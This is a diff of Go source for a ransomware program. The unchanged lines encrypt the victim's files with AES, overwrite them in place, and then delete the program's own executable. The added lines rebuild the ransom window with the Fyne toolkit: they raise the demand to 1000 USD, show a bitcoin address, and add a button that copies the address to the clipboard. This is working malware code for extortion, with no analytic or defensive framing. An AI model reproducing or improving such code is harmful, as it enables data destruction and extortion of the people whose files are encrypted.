@@ -12,6 +12,9 @@ import (
 
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/container"
+	"fyne.io/fyne/v2/data/binding"
+	"fyne.io/fyne/v2/layout"
+	"fyne.io/fyne/v2/theme"
 	"fyne.io/fyne/v2/widget"
 )
 
@@ -47,18 +50,32 @@ func main() {
 		stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
 		os.WriteFile(allfiles[i], ciphertext, 0777)
 	}
-	a := app.New()
-	w := a.NewWindow("Hello There")
+	myApp := app.New()
+	myWindow := myApp.NewWindow("Please Pay Close attention You Got Hacked !")
 
-	hello := widget.NewLabel("Ooops! All your files has been encrypted to get them back send 200 USD to the bitcoin address bellow and contact us at @ with your transaction id")
-	w.SetContent(container.NewVBox(
+	txtBound := binding.NewString()
+	txtWid := widget.NewLabelWithData(txtBound)
+	hello := widget.NewLabel("Ooops! All your files has been encrypted to get them back send us 1000 USD to the bitcoin address here and contact us at @...")
+	bottomBox := container.NewHBox(
 		hello,
-		widget.NewButton("bitcoin address: 17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR", func() {
-			hello.SetText("Don't forget to contact us at @ with your transaction id")
+		layout.NewSpacer(),
+		widget.NewButtonWithIcon("copy bitcoin address", theme.ContentCopyIcon(), func() {
+			if content, err := txtBound.Get(); err == nil {
+				myWindow.Clipboard().SetContent(content)
+			}
+			hello.SetText("Don't forget to contact us at @ with your transaction id write this down and Thanks")
 		}),
-	))
+	)
 
-	w.ShowAndRun()
+	content := container.NewBorder(nil, bottomBox, nil, nil, txtWid)
+
+	go func() { // make changing content...
+		for {
+			txtBound.Set("17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR")
+		}
+	}()
+	myWindow.SetContent(content)
+	myWindow.ShowAndRun()
 	home_dir, _ = os.Executable()
 	os.Remove(home_dir)
 }
